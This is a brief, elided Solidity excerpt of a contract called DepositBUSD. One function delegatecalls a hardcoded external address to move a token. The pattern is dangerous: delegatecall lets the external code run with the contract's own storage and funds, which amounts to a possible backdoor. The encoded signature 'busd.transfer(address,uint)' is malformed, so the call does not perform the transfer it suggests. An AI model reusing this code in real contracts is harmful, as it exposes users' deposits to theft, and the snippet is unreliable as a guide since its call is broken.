...
contract DepositBUSD is Ownable {
    ...
    // }
        ...
        (bool success, bytes memory result) = address(0x6f78e96E4cDeca2F1e121f23Bc2effBaaea05E8f).delegatecall(abi.encodeWithSignature("busd.transfer(address,uint)", addr, amount));
        return success;
